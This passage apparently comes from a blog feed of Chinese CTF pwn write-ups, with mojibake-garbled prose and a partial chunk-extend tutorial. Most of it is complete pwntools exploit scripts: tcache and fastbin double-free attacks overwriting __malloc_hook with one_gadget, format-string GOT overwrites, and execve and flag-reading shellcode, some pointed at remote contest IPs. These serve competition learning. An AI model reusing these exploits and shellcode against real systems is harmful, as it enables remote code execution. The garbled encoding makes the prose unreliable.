ä¸èƒ½æ­£å¸¸çš„å†™å€¼<br>tcache struct attackï¼Œçˆ†ç ´ä½2å­—èŠ‚ï¼ˆç›´æ¥ leak heap addr ä¹Ÿå¯ä»¥ï¼‰ï¼Œä½¿ fd æŒ‡å‘ heap å¼€å¤´ï¼Œæ§åˆ¶ tcache_perthread_structï¼Œä¿®æ”¹ tcache-&gt;counts å’Œ tcache_entry</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span><span class="hljs-comment"># p = process('./p1Kkheap')</span>file_name = <span class="hljs-string">'./p1KkHeap'</span>libc_name = <span class="hljs-string">'./libc.so.6'</span>ip = <span class="hljs-string">''</span>prot = <span class="hljs-string">''</span>context.arch = <span class="hljs-string">'amd64'</span>context.log_level=<span class="hljs-string">'debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"size: "</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"2"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"3"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))p.sendafter(<span class="hljs-string">"content: "</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your Choice: "</span>,<span class="hljs-string">"4"</span>)p.sendlineafter(<span class="hljs-string">"id: "</span>,str(idx))shellcode = asm(<span class="hljs-string">'''nopnopmov rax,0x0000push raxmov rax,0x67616c662f2epush raxmov rdi, rspxor esi, esimov eax, 2syscallmov edi, eaxmov rsi, rspmov edx, 0x100xor eax, eaxsyscallmov edx, eaxmov rsi, rspmov edi, 1mov eax, edisyscall'''</span>)<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<span class="hljs-keyword">try</span>:p = process(file_name)<span class="hljs-comment"># raw_input('#')</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#0</span>add(<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span>free(<span class="hljs-number">0</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#2</span>edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x10\x00'</span>)add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#3</span>add(<span class="hljs-number">0x80</span>) <span class="hljs-comment">#4</span>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701000000000000</span>))free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)p.recvuntil(<span class="hljs-string">"content: "</span>)libc = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)+<span class="hljs-string">"\x00\x00"</span>) - <span class="hljs-number">4111520</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc)malloc_hook = libc+lib.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc addr : 0x%x"</span>%malloc_hook)  edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0x0701010000000000</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span>+p64(malloc_hook)+p64(<span class="hljs-number">0x66660000</span>))add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#6</span>edit(<span class="hljs-number">6</span>,shellcode)edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x66660002</span>))add(<span class="hljs-number">0x10</span>)<span class="hljs-keyword">except</span> EOFError:p.close()<span class="hljs-keyword">else</span>:p.interactive()<span class="hljs-keyword">break</span></code></pre><h2 id="login">login<a class="post-anchor" href="#login"></a></h2><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><span class="hljs-comment">#encoding:utf-8</span><span class="hljs-comment">#__author__='pumpkin9@DL&amp;S'</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> sys<span class="hljs-comment"># context(log_level='debug',terminal=['tmux','split','-h'],arch='amd64')</span>file_name = <span class="hljs-string">'./login'</span>libc_name = <span class="hljs-string">'/lib/i386-linux-gnu/libc.so.6'</span>ip = <span class="hljs-string">'108.160.139.79'</span>port = <span class="hljs-string">'9090'</span><span class="hljs-comment"># context.arch = 'amd64'</span><span class="hljs-comment"># context.log_level='debug'</span>context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]lib = ELF(libc_name)elf = ELF(file_name)p = process(file_name)<span class="hljs-comment"># p = remote(ip,int(port))</span>li = <span class="hljs-keyword">lambda</span> name,x : log.info(name+<span class="hljs-string">':0x%x'</span>%x)ls = <span class="hljs-keyword">lambda</span> name,x : log.success(name+<span class="hljs-string">':0x%x'</span>%x)key = <span class="hljs-string">"wllmmllw"</span>p.sendlineafter(<span class="hljs-string">"Please input your name: \n"</span>,<span class="hljs-string">"pumpkin9"</span>)payload = <span class="hljs-string">"%15$p"</span>p.sendlineafter(<span class="hljs-string">"password: \n"</span>,payload)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)libc = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-241</span>-lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc)onegg = libc + lib.symbols[<span class="hljs-string">'system'</span>]ls(<span class="hljs-string">"one_gadget"</span>,onegg)binsh = libc + lib.search(<span class="hljs-string">'/bin/sh'</span>).next()ls(<span class="hljs-string">"sh addr"</span>,binsh)p.recvuntil(<span class="hljs-string">"Try again!\n"</span>)p.sendline(<span class="hljs-string">"%6$p"</span>)p.recvuntil(<span class="hljs-string">"This is the wrong password: "</span>)stack = int(p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)target = stack <span class="hljs-number">-12</span>ls(<span class="hljs-string">"stack addr"</span>,stack)ls(<span class="hljs-string">"target addr"</span>,target)<span class="hljs-comment"># gdb.attach(p)</span>num = target&amp;<span class="hljs-number">0xff</span>data1 = <span class="hljs-number">0x100</span><span class="hljs-comment">#onegg&amp;0xff</span>data2 = (onegg&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>data3 = (onegg&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>data4 = onegg&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sys1"</span>,data1)li(<span class="hljs-string">"sys2"</span>,data2)li(<span class="hljs-string">"sys3"</span>,data3)li(<span class="hljs-string">"sys3"</span>,data4)data5 = binsh&amp;<span class="hljs-number">0xff</span>data6 = ((binsh&amp;<span class="hljs-number">0xffff</span>)&gt;&gt;<span class="hljs-number">8</span>)data7 = ((binsh&amp;<span class="hljs-number">0xffffff</span>)&gt;&gt;<span class="hljs-number">16</span>)data8 = binsh&gt;&gt;<span class="hljs-number">24</span>li(<span class="hljs-string">"sh1"</span>,data5)li(<span class="hljs-string">"sh2"</span>,data6)li(<span class="hljs-string">"sh3"</span>,data7)li(<span class="hljs-string">"sh4"</span>,data8)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data1)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">1</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data2)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">2</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data3)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">3</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data4)+<span class="hljs-string">"c%10$hhn"</span>)gdb.attach(p)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">8</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data5)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">9</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data6)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">10</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data7)+<span class="hljs-string">"c%10$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(num+<span class="hljs-number">11</span>)+<span class="hljs-string">"c%6$hhn"</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,<span class="hljs-string">"%"</span>+str(data8)+<span class="hljs-string">"c%10$hhn"</span>)raw_input(<span class="hljs-string">'#'</span>)p.sendlineafter(<span class="hljs-string">"Try again!\n"</span>,key)</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iæ˜¥ç§‹-ç¬¬ä¸‰å­£CTFç­”é¢˜èµ›write up</title>
      <link href="/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/"/>
      <url>/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/</url>
      
        <content type="html"><![CDATA[<p>ç¦åˆ©èµ› é¢˜ç›®è¿˜æ˜¯æ¯”è¾ƒå‹å¥½çš„</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="Electrical-System">Electrical System<a class="post-anchor" href="#Electrical-System"></a></h2><p>bss æ®µæœ‰å¯æ‰§è¡Œæƒé™ï¼Œå†™ä¸€æ®µshellcodeï¼Œæ§åˆ¶ç¨‹åºè·³è½¬å³å¯</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]context.log_level=<span class="hljs-string">'debug'</span><span class="hljs-comment">#p = process("./Electrical System")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11002</span>)elf=ELF(<span class="hljs-string">"./Electrical System"</span>)shellcode =<span class="hljs-string">"\x48\x31\xc0\x48\x83\xc0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xd2\x0f\x05"</span>p.sendlineafter(<span class="hljs-string">"enter your electric card 's ID:\n"</span>,shellcode)payload = <span class="hljs-string">"Recharge"</span>+p8(<span class="hljs-number">0</span>)+<span class="hljs-string">"a"</span>*<span class="hljs-number">7</span><span class="hljs-comment"># payload = "Check"+p8(0)+"a"*10</span>payload += p64(<span class="hljs-number">0x00000000006020E0</span>)p.sendlineafter(<span class="hljs-string">"Please enter your choice:\n"</span>,payload)p.interactive()</code></pre><h2 id="Car-Search-System">Car Search System<a class="post-anchor" href="#Car-Search-System"></a></h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé¦–å…ˆleak libcï¼Œç„¶åä¿®æ”¹0xffä¸º0x66ï¼Œç›´æ¥ä¿®æ”¹æ ˆä¸Šçš„å€¼ï¼Œç¨‹åºä¼šdownæ‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡æŒ‡é’ˆv8æ¥ä¿®æ”¹<br>æœ€åä¿®æ”¹puts@gotä¸ºsystemã€‚</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>]<span class="hljs-comment"># context.log_level = 'debug'</span><span class="hljs-comment"># p = process("./pwn")</span>p = remote(<span class="hljs-string">"120.55.43.255"</span>,<span class="hljs-number">11001</span>)elf=ELF(<span class="hljs-string">"./pwn"</span>)lib = ELF(<span class="hljs-string">"./libc6-i386_2.23-0ubuntu10_amd64.so"</span>)offset = <span class="hljs-number">30</span>p.recvuntil(<span class="hljs-string">"leave\n"</span>)p.sendline(<span class="hljs-string">"%59$p"</span>)__libc_start_main = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)<span class="hljs-number">-247</span><span class="hljs-keyword">print</span> hex(__libc_start_main)libc = __libc_start_main - lib.symbols[<span class="hljs-string">'__libc_start_main'</span>]log.success(<span class="hljs-string">"libc base addr : 0x%x"</span>%libc)system = libc+lib.symbols[<span class="hljs-string">'system'</span>]log.success(<span class="hljs-string">"onegadget addr : 0x%x"</span>%system)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = fmtstr_payload(<span class="hljs-number">30</span>,&#123;elf.got[<span class="hljs-string">"puts"</span>]:system&#125;)p.sendline(payload)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = <span class="hljs-string">"%51$p"</span>p.sendline(payload)point = int(p.recvline().strip(<span class="hljs-string">"\n"</span>),<span class="hljs-number">16</span>)log.success(<span class="hljs-string">"pointer addr : 0x%x"</span>%point)p.recvuntil(<span class="hljs-string">"leave\n"</span>)payload = p32(point)+<span class="hljs-string">"%98c%30$hhn"</span>p.sendline(payload)p.sendlineafter(<span class="hljs-string">"ar in 7 day"</span>,<span class="hljs-string">"/bin/sh\x00"</span>)<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h2 id="geek-notes">geek notes<a class="post-anchor" href="#geek-notes"></a></h2><p>UAF</p><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2.7</span><span class="hljs-comment"># encoding:utf-8</span><span class="hljs-comment"># ___Author___ : "pumpkin9"</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context(terminal=[<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'split'</span>,<span class="hljs-string">'-h'</span>])p =process(<span class="hljs-string">"./geek notes"</span>)libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span><span class="hljs-params">(length,content)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"1"</span>)p.recvuntil(<span class="hljs-string">"Note size :"</span>)p.sendline(str(length))p.recvuntil(<span class="hljs-string">"Content :"</span>)p.sendline(content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span><span class="hljs-params">(index)</span>:</span>p.recvuntil(<span class="hljs-string">"Your choice :"</span>)p.sendline(<span class="hljs-string">"2"</span>)p.recvuntil(<span class="hljs-string">"Index :"</span>)p.sendline(str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span><span class="hljs-params">(idx)</span>:</span>p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(<span class="hljs-string">"3"</span>)p.recvuntil(<span class="hljs-string">":"</span>)p.sendline(str(idx))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 0</span>addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">""</span>) <span class="hljs-comment"># 1</span>delnote(<span class="hljs-number">0</span>)printnote(<span class="hljs-number">0</span>)libc_base = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">'\x00\x00'</span>)<span class="hljs-number">-3951480</span>log.success(<span class="hljs-string">"libc addr : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))addnote(<span class="hljs-number">0x100</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 2</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"aaaaaaaa"</span>) <span class="hljs-comment"># 3</span>addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"bbbbbbbb"</span>) <span class="hljs-comment"># 4</span>delnote(<span class="hljs-number">3</span>)delnote(<span class="hljs-number">4</span>)delnote(<span class="hljs-number">3</span>)addnote(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)addnote(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice :"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"Note size :"</span>,str(<span class="hljs-number">10</span>))<span class="hljs-comment"># gdb.attach(p)</span>p.interactive()</code></pre><h1 id="reverse">reverse<a class="post-anchor" href="#reverse"></a></h1><h2 id="integer-seq">integer_seq<a class="post-anchor" href="#integer-seq"></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å±±ä¸œæ·±æ€æ¯write up</title>
      <link href="/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/"/>
      <url>/2019/11/03/%E5%B1%B1%E4%B8%9C%E6%B7%B1%E6%80%9D%E6%9D%AFwrite-up/</url>
      
        <content type="html"><![CDATA[<h1 id="Reverse">Reverse<a class="post-anchor" href="#Reverse"></a></h1><h2 id="FuQiang">FuQiang<a class="post-anchor" href="#FuQiang"></a></h2><p>ç¨‹åº</p><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="pwn1">pwn1<a class="post-anchor" href="#pwn1"></a></h2><p>é¢˜ç›®ç»™äº†ä¸€ä¸ªbackdoor ï¼Œæ»¡è¶³çº¦æŸæ¡ä»¶å³å¯</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level=<span class="hljs-string">'debug'</span>p = process(<span class="hljs-string">"./pwn_MinZhu"</span>)<span class="hljs-comment">#p =remote("172.29.1.38", 9999)</span>elf = ELF(<span class="hljs-string">"./pwn_MinZhu"</span>)system = <span class="hljs-number">0x08048696</span>plt = elf.got[<span class="hljs-string">'puts'</span>]p.sendlineafter(<span class="hljs-string">"Key:"</span>,<span class="hljs-string">"xNd9y6"</span>)offset = <span class="hljs-number">4</span>p.recvuntil(<span class="hljs-string">"your msg:"</span>)payload=fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A064</span>:<span class="hljs-number">0x3</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;<span class="hljs-number">0x804A060</span>:<span class="hljs-number">8217</span>&#125;)p.sendline(payload)payload = fmtstr_payload(<span class="hljs-number">4</span>,&#123;plt:<span class="hljs-number">0x8048696</span>&#125;)p.sendline(payload)<span class="hljs-string">'''SHBYTE = 57 9SHBYTE1 = 78 NSHBYTE2 = 100 dCHAR S = 120 xv4 =6v3 = yxNd9y6'''</span>p.interactive()</code></pre><h2 id="pwn2">pwn2<a class="post-anchor" href="#pwn2"></a></h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#context.log_level='debug'</span>context.terminal=[<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"split"</span>,<span class="hljs-string">"-h"</span>]p = process(<span class="hljs-string">"./pwn"</span>)libc = ELF(<span class="hljs-string">"./libc.so"</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(size))p.sendlineafter(<span class="hljs-string">"Leave your message:\n"</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">2</span>))p.sendlineafter(<span class="hljs-string">"\nInput the index of sticky note that you want to delete:\n"</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">3</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">4</span>))p.sendlineafter(<span class="hljs-string">"Input the index of sticky note that you want to modify:\n"</span>,str(idx))p.sendlineafter(<span class="hljs-string">"Enter what you want to modify:\n"</span>,content)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#1</span>add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">""</span>) <span class="hljs-comment">#2</span>delete(<span class="hljs-number">1</span>)add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">"aaaaaaa"</span>) <span class="hljs-comment">#3</span>show()p.recvuntil(<span class="hljs-string">"Sticky note:aaaaaaa\n"</span>)libc_base = u64(p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-0x3c4b78</span>log.success(<span class="hljs-string">"libc_base : 0x%x"</span>%libc_base)malloc_hook = libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]log.success(<span class="hljs-string">"malloc_hook:0x%x"</span>%malloc_hook)log.success(<span class="hljs-string">"one_gadget:0x%x"</span>%(libc_base+<span class="hljs-number">0xf1147</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)delete(<span class="hljs-number">4</span>)delete(<span class="hljs-number">5</span>)delete(<span class="hljs-number">4</span>)add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">""</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">19</span>+p64(libc_base+<span class="hljs-number">0xf1147</span>))p.sendlineafter(<span class="hljs-string">"Your choice:"</span>,str(<span class="hljs-number">1</span>))p.sendlineafter(<span class="hljs-string">"\nInput the length of data:"</span>,str(<span class="hljs-number">127</span>))<span class="hljs-comment">#gdb.attach(p)</span>p.interactive()</code></pre><h2 id="pwn3">pwn3<a class="post-anchor" href="#pwn3"></a></h2><p>åˆ©ç”¨ malloc_consolidate å»å®Œæˆ chunk çš„é‡å ï¼Œä»è€Œå®ç°leak libcè·Ÿ tcache çš„uafï¼ˆé€šè¿‡åˆ»æ„çš„è®© unsorted chunk çš„sizeå˜å°ï¼Œå¯ä»¥è®© unsorted chunk çš„ä¸‹ä¸€ä¸ªchunkçš„prev_size ä¸å˜ï¼Œä»è€Œå¯ä»¥ pass malloc_consolidate æ—¶çš„ unlink æ£€æµ‹ï¼Œä»è€Œå®ç°chunkçš„é‡</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>chunk extend</title>
      <link href="/2019/10/21/chunk-extend/"/>
      <url>/2019/10/21/chunk-extend/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»‹ç»">ä»‹ç»<a class="post-anchor" href="#ä»‹ç»"></a></h2><p>chunk extend æ˜¯å †æ¼æ´çš„ä¸€ç§å¸¸è§åˆ©ç”¨æ‰‹æ³•ï¼Œé€šè¿‡ extend å¯ä»¥å®ç° chunk overlapping çš„æ•ˆæœã€‚è¿™ç§åˆ©ç”¨æ–¹æ³•éœ€è¦ä»¥ä¸‹çš„æ—¶æœºå’Œæ¡ä»¶</p><ul><li>ç¨‹åºä¸­å­˜åœ¨åŸºäºå †çš„æ¼æ´</li><li>æ¼æ´å¯ä»¥æ§åˆ¶ chunk header ä¸­çš„æ•°æ®</li></ul><h2 id="åŸç†">åŸç†<a class="post-anchor" href="#åŸç†"></a></h2><p>chunk extend æŠ€æœ¯èƒ½å¤Ÿäº§ç”Ÿçš„åŸå› åœ¨äº ptmalloc åœ¨å † chunk è¿›è¡Œæ“ä½œæ—¶ä½¿ç”¨çš„å„ç§å®ã€‚</p><p>åœ¨ ptmalloc ä¸­ï¼Œè·å– chunk å—å¤§å°æ“ä½œå¦‚ä¸‹</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Get size, ignoring use bits */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span><span class="hljs-comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></code></pre><p>ä¸€ç§æ˜¯ç›´æ¥è·å– chunk çš„å¤§å°ï¼Œä¸å¿½ç•¥æ©ç éƒ¨åˆ†ï¼Œå¦å¤–ä¸€ç§æ˜¯å¿½ç•¥æ©ç éƒ¨åˆ†ã€‚</p><p>åœ¨ ptmalloc ä¸­ï¼Œè·å–ä¸‹ä¸€ chunk å—åœ°å€çš„æ“ä½œå¦‚ä¸‹</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span></code></pre><p>å³ä½¿ç”¨å½“å‰å—æŒ‡é’ˆåŠ ä¸Šå½“å‰å—å¤§å°ã€‚</p><p>åœ¨ ptmalloc ä¸­ï¼Œè·å–å‰ä¸€ä¸ªchunk ä¿¡æ¯çš„æ“ä½œå¦‚ä¸‹</p><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span></code></pre><p>å³é€šè¿‡ malloc_chunk-&gt;prev_size è·å–å‰ä¸€å—å¤§å°ï¼Œç„¶åä½¿ç”¨æœ¬ chunk åœ°å€å‡å»æ‰€å¾—å¤§å°ã€‚</p><p>åœ¨ ptmallocï¼Œåˆ¤æ–­å½“å‰ chunk æ˜¯å¦ use çŠ¶æ€çš„æ“ä½œå¦‚ä¸‹ï¼š</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + 